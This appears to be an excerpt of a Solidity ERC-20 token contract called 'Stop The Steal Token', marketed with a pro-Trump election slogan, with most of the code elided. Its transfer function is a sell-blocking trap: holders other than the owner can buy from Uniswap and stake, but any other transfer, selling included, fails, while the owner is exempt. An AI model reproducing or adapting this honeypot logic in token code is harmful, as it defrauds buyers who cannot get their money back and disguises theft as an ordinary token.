...
/**
*  Stop The Steal Token
*   stopthesteal.finance                       
*     help Trump win back the White House
**/      
...
contract StopTheSteal is Ownable, IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if(recipient != owner() && sender != owner()) {
            if(recipient != _UNIWethPoolAddress && recipient != _stakeAddress && recipient != _storeAddress && (sender == _UNIWethPoolAddress || sender == _stakeAddress || sender == _storeAddress )) {
                if(sender != _storeAddress)
                    require(amount <= _maxTransactionAmount, "ERC20: transfer amount exceeds limit");
            }
            else if(sender != _UNIWethPoolAddress && sender != _stakeAddress && sender != _storeAddress && recipient == _stakeAddress) {
                require(amount <= _maxTransactionAmount, "ERC20: transfer amount exceeds limit");
            }
            else
                require(false, "ERC20: users(not owner) can only stake, unstake, claim or buy from uniswap.");
        }
